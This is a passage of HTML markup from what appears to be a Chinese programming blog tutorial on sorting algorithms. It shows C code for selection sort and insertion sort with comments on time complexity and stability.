class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-19\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">         </span><span class=\"crayon-c\">// i为已排序序列的末尾</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// 未排序序列</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-25\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">min</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">              </span><span class=\"crayon-c\">// 找出未排序序列中的最小值</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-26\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-27\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">min</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-28\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-29\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">min</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-32\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 放到已排序序列的末尾，该操作很有可能把稳定性打乱，所以选择排序是不稳定的排序算法</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-35\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-36\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-37\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-38\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 从小到大选择排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">SelectionSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"选择排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-45\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-48\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-49\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.2124 seconds] -->\r\n<p>上述代码对序列{ 8, 5, 2, 6, 9, 3, 1, 4, 0, 7 }进行选择排序的实现过程如右图：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fr773lxfs0g202s0ab755.gif\" width=\"100\" height=\"371\"></p>\n<p>使用选择排序为一列数字进行排序的宏观过程：</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fr773pu3lpg20800800st.gif\" width=\"288\" height=\"288\"></p>\n<p><strong>选择排序是不稳定的排序算法，不稳定发生在最小元素与A[i]交换的时刻。</strong></p>\n<p>比如序列：{ 5, 8, 5, 2, 9 }，一次选择的最小元素是2，然后把2和第一个5进行交换，从而改变了两个元素5的相对次序。</p>\n<h2>插入排序(Insertion Sort)</h2>\n<p>插入排序是一种简单直观的排序算法。它的工作原理非常类似于我们抓扑克牌</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/1b14765ef10c4c9e36d76896bee524b9.jpg\" alt=\"\"></p>\n<p>对于未排序数据(右手抓到的牌)，在已排序序列(左手已经排好序的手牌)中从后向前扫描，找到相应位置并插入。</p>\n<p>插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p>\n<p>具体算法描述如下：</p>\n<ol>\n<li>从第一个元素开始，该元素可以认为已经被排序</li>\n<li>取出下一个元素，在已经排序的元素序列中从后向前扫描</li>\n<li>如果该元素（已排序）大于新元素，将该元素移到下一位置</li>\n<li>重复步骤3，直到找到已排序的元素小于或者等于新元素的位置</li>\n<li>将新元素插入到该位置后</li>\n<li>重复步骤2~5</li>\n</ol>\n<p>插入排序的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b72592537449\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n\r\n// 分类 ------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- 最坏情况为输入序列是降序排列的,此时时间复杂度O(n^2)\r\n// 最优时间复杂度 ---- 最好情况为输入序列是升序排列的,此时时间复杂度O(n)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 稳定\r\n\r\nvoid InsertionSort(int A[], int n)\r\n{\r\n    for (int i = 1; i &lt; n; i++)         // 类似抓扑克牌排序\r\n    {\r\n        int get = A[i];                 // 右手抓到一张扑克牌\r\n        int j = i - 1;                  // 拿在左手上的牌总是排序好的\r\n        while (j &gt;= 0 &amp;&amp; A[j] &gt; get)    // 将抓到的牌与手牌从右向左进行比较\r\n        {\r\n            A[j + 1] = A[j];            // 如果该手牌比抓到的牌大，就将其右移\r\n            j--;\r\n        }\r\n        A[j + 1] = get; // 直到该手牌比抓到的牌小(或二者相等)，将抓到的牌插入到该手牌右边(相等元素的相对次序未变，所以插入排序是稳定的)\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 6, 5, 3, 1, 8, 7, 2, 4 };// 从小到大插入排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    InsertionSort(A, n);\r\n    printf(\"插入排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b72592537449-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b72592537449-38\">38</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-3\"><span class=\"crayon-c\">// 分类 ------------- 内部比较排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-4\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-5\"><span class=\"crayon-c\">// 最差时间复杂度 ---- 最坏情况为输入序列是降序排列的,此时时间复杂度O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-6\"><span class=\"crayon-c\">// 最优时间复杂度 ---- 最好情况为输入序列是升序排列的,此时时间复杂度O(n)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-7\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-8\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(1)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-9\"><span class=\"crayon-c\">// 稳定性 ------------ 稳定</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-11\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">InsertionSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">         </span><span class=\"crayon-c\">// 类似抓扑克牌排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                 </span><span class=\"crayon-c\">// 右手抓到一张扑克牌</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                  </span><span class=\"crayon-c\">// 拿在左手上的牌总是排序好的</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 将抓到的牌与手牌从右向左进行比较</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-19\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 如果该手牌比抓到的牌大，就将其右移</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 直到该手牌比抓到的牌小(或二者相等)，将抓到的牌插入到该手牌右边(相等元素的相对次序未变，所以插入排序是稳定的)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-24\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-25\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-26\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b72592537449-27\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b72592537449-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span 